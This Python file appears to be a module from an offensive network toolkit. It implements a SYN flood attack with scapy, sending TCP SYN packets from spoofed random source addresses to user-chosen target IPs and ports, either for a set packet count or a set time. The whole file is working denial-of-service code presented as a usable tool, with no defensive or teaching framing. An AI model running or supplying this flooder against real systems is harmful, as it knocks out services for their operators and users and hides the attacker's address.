from scapy.all import *

from lib.cmd_tool import *
from lib.EZData import *
import lib.ColorPrint as cp

NAME = 'SynFlood'

class Module:
    def __init__(self):
        self.config = {
            'IP': {
                'value': '',
                'help': 'Target IP.',
            },
            'Ports': {
                'value': '80',
                'help': 'Target ports.',
            },
            'Count': {
                'value': '100',
                'help': 'Count of packets.',
            },
            'Time': {
                'value': '10',
                'help': 'Time of sending packet.'
            },
            'Mode': {
                'value': '0',
                'help': 'Run method.',
                'option': {
                    MODE_COUNT: 'Stop sending when total sent reach the maximum number.',
                    MODE_TIME: 'Stop sending after specified time(seconds).'
                },
            } 
        }

        self.help = 'Send SYN flooding packets'

    def validate(self) -> bool:
        if not self.config['IP']['value'] or self.config['IP']['value'].replace(' ', '') == '':
            cp.pf_failed('\'IP\' is null or empty.')
            return False
        
        if not self.config['Ports']['value']:
            cp.pf_failed('\'Ports\' is null or empty.')
        
        return True


    def interactive(self):
        interactive(self, 'syn_flood')

    def run(self):
        def send_syn(ip: str, port: int):
            s_port = randInt()
            seq = randInt()
            window = randInt()

            pktIP = IP()
            pktIP.src = randIP()
            pktIP.dst = ip

            pktTCP = TCP()
            pktTCP.sport = s_port
            pktTCP.dport = port
            pktTCP.flags = "S"
            pktTCP.seq = seq
            pktTCP.window = window

            send(pktIP / pktTCP, verbose=0)

        try:
            print(conf.iface)
            conf.iface = 'Wi-Fi'
            print(conf.iface)
            
            total = 0
            cnt = int(get_value(self.config, 'Count'))
            mode = get_optionIdx(self.config, 'mode')

            lsIP = [_ for _ in get_value(self.config, 'IP').split(',')]
            lsPort = [int(_) for _ in get_value(self.config, 'Ports').split(',')]

            lsHost = list()

            for ip in lsIP:
                for port in lsPort:
                    lsHost.append((ip, port))

            if len(lsHost) > 1:
                cp.pf_warn(f'More then one target, this tool will send {cnt} packet{"" if cnt == 1 else "s"} for each target.')

            if mode == MODE_COUNT:
                for host in lsHost:
                    ip, port = host
                    for i in range(0, cnt):
                        send_syn(ip, port)
                        total += 1

            elif mode == MODE_TIME:
                nSecond = int(get_value(self.config, 'Time'))
                for host in lsHost:
                    ip, port = host
                    total = doWorkWithSeconds(send_syn, nSecond, {'ip': ip, 'port': port})

            cp.pf_ok(f'Done, total={total}')

        except Exception as ex:
            cp.pf_failed(str(ex))
            raise ex